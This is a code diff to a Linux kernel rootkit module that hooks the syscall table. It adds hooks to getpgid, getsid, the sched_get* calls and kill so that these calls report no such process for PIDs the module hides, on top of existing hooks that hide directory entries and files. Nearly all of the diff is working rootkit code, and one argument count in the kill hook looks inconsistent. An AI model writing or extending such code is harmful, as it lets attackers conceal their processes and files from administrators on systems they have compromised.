@@ -97,14 +97,21 @@ unsigned long *syscall_table = NULL;
 	if (sys_define(name_mayus)) syscall_table[sys_num(name)] = sys_orig(name);
 // END HOOK DEFINING MACROS -----------------------------------------
 
-hook_define(3, long, getdents, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count);
-hook_define(3, long, getdents64, unsigned int, fd, struct linux_dirent64 __user*, dirent, unsigned int, count);
-hook_define(2, long, stat, const char __user*, pathname, struct __old_kernel_stat __user*, statbuf);
-hook_define(2, long, lstat, const char __user*, pathname, struct __old_kernel_stat __user*, statbuf);
-hook_define(1, long, chdir, const char __user*, pathname);
-hook_define(2, long, getpriority, int, which, int, who);
-hook_define(3, long, open, const char __user*, pathname, int, flags, umode_t, mode);
-hook_define(4, long, openat, int, dfd, const char __user*, pathname, int, flags, umode_t, mode);
+hook_define(3, long, getdents, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count)
+hook_define(3, long, getdents64, unsigned int, fd, struct linux_dirent64 __user*, dirent, unsigned int, count)
+hook_define(2, long, stat, const char __user*, pathname, struct __old_kernel_stat __user*, statbuf)
+hook_define(2, long, lstat, const char __user*, pathname, struct __old_kernel_stat __user*, statbuf)
+hook_define(1, long, chdir, const char __user*, pathname)
+hook_define(2, long, getpriority, int, which, int, who)
+hook_define(3, long, open, const char __user*, pathname, int, flags, umode_t, mode)
+hook_define(4, long, openat, int, dfd, const char __user*, pathname, int, flags, umode_t, mode)
+hook_define(1, long, getpgid, pid_t, pid)
+hook_define(1, long, getsid, pid_t, pid)
+hook_define(3, long, sched_getaffinity, pid_t, pid, unsigned int, len, unsigned long __user*, user_mask_ptr)
+hook_define(2, long, sched_getparam, pid_t, pid, struct sched_param __user *, param)
+hook_define(1, long, sched_getscheduler, pid_t, pid)
+hook_define(2, long, sched_rr_get_interval, pid_t, pid, struct __kernel_timespec __user *, interval)
+hook_define(2, long, kill, pid_t, pid, int, sig)
 
 asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user* dirent, unsigned int count, const struct pt_regs* regs) {
 	int buff_offset, deleted_size;
@@ -273,6 +280,41 @@ asmlinkage long sys_openat_do_hook(int dfd, const char __user *pathname, int fla
 	return sys_openat_orig(ARGS_ORIG(4, int, dfd, const char __user*, pathname, int, flags, umode_t, mode));
 }
 
+asmlinkage long sys_getpgid_do_hook(pid_t pid, const struct pt_regs* regs){
+	if (check_pid(pid, "getpgid") == -1) return -ESRCH;
+	return sys_getpgid_orig(ARGS_ORIG(1, pid_t, pid));
+}
+
+asmlinkage long sys_getsid_do_hook(pid_t pid, const struct pt_regs* regs){
+	if (check_pid(pid, "getsid") == -1) return -ESRCH;
+	return sys_getsid_orig(ARGS_ORIG(1, pid_t, pid));
+}
+
+asmlinkage long sys_sched_getaffinity_do_hook(pid_t pid, unsigned int len, unsigned long __user *user_mask_ptr, const struct pt_regs* regs){
+	if (check_pid(pid, "sched_getaffinity") == -1) return -ESRCH;
+	return sys_sched_getaffinity_orig(ARGS_ORIG(3, pid_t, pid, unsigned int, len, unsigned long __user*, *user_mask_ptr));
+}
+
+asmlinkage long sys_sched_getparam_do_hook(pid_t pid, struct sched_param __user *param, const struct pt_regs* regs){
+	if (check_pid(pid, "sched_getparam") == -1) return -ESRCH;
+	return sys_sched_getparam_orig(ARGS_ORIG(2, pid_t, pid, struct sched_param __user *, param));
+}
+
+asmlinkage long sys_sched_getscheduler_do_hook(pid_t pid, const struct pt_regs* regs){
+	if (check_pid(pid, "sched_getscheduler") == -1) return -ESRCH;
+	return sys_sched_getscheduler_orig(ARGS_ORIG(1, pid_t, pid));
+}
+
+asmlinkage long sys_sched_rr_get_interval_do_hook(pid_t pid, struct __kernel_timespec __user *interval, const struct pt_regs* regs){
+	if (check_pid(pid, "sched_rr_get_interval") == -1) return -ESRCH;
+	return sys_sched_rr_get_interval_orig(ARGS_ORIG(2, pid_t, pid, struct __kernel_timespec __user *, interval));
+}
+
+asmlinkage long sys_kill_do_hook(pid_t pid, int sig, const struct pt_regs* regs){
+	if (check_pid(pid, "kill") == -1) return -ESRCH;
+	return sys_kill_orig(ARGS_ORIG(1, pid_t, pid, int, sig));
+}
+
 
 //__init para que solo lo haga una vez y después pueda sacarlo de memoria
 int __init hooks_init(void){
@@ -292,6 +334,13 @@ int __init hooks_init(void){
 	perform_hook(getpriority, GETPRIORITY)
 	perform_hook(open, OPEN)
 	perform_hook(openat, OPENAT)
+	perform_hook(getpgid, GETPGID);
+	perform_hook(getsid, GETSID);
+	perform_hook(sched_getaffinity, SCHED_GETAFFINITY);
+	perform_hook(sched_getparam, SCHED_GETPARAM);
+	perform_hook(sched_getscheduler, SCHED_GETSCHEDULER);
+	perform_hook(sched_rr_get_interval, SCHED_RR_GET_INTERVAL);
+	perform_hook(kill, KILL);
 	DISABLE_WRITE();
 
 	printk(KERN_INFO "ROOTKIT: Finished hooks\n");
@@ -309,6 +358,13 @@ void __exit hooks_exit(void){
 	disable_hook(getpriority, GETPRIORITY)
 	disable_hook(open, OPEN)
 	disable_hook(openat, OPENAT)
+	disable_hook(getpgid, GETPGID);
+	disable_hook(getsid, GETSID);
+	disable_hook(sched_getaffinity, SCHED_GETAFFINITY);
+	disable_hook(sched_getparam, SCHED_GETPARAM);
+	disable_hook(sched_getscheduler, SCHED_GETSCHEDULER);
+	disable_hook(sched_rr_get_interval, SCHED_RR_GET_INTERVAL);
+	disable_hook(kill, KILL);
 	DISABLE_WRITE();
 
 	// delete lists
